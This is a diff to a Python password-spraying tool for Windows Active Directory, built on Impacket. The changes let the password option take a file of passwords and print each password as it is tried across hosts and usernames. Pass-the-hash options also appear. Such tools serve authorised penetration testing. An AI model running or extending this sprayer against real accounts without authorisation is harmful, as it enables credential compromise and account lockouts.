@@ -114,7 +114,7 @@ def mt_execute(username, host_ip, passwd):  # multithreading requires a function
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help=True, description="Impacket made password sprayer for Windows AD")
     parser.add_argument('-u', action='store', help='Username or path to file containing usernames 1 per line')
-    parser.add_argument('-p', action='store', help='Password to try')
+    parser.add_argument('-p', action='store', help='Password to try or file of passwords')
     parser.add_argument('-d', action='store', help='FQDN to use')
     parser.add_argument('-H', action='store', help='Password hash to use LM:NT')
     parser.add_argument('-o', action='store', help='Output file')
@@ -233,6 +233,7 @@ if __name__ == '__main__':
         with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
             for curr_ip in addresses:
                 for password in password_list:
+                    print('Trying password {}'.format(password))
                     for username in users_cleaned:
                         try:
                             out = thread_exe.schedule(mt_execute, (username,curr_ip,password,), timeout=options.timeout)
@@ -250,6 +251,7 @@ if __name__ == '__main__':
     else:
         with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
             for password in password_list:
+                print('Trying password {}'.format(password))
                 for username in users_cleaned:
                     curr_ip = addresses[random.randint(0, len(addresses)-1)]
                     try:
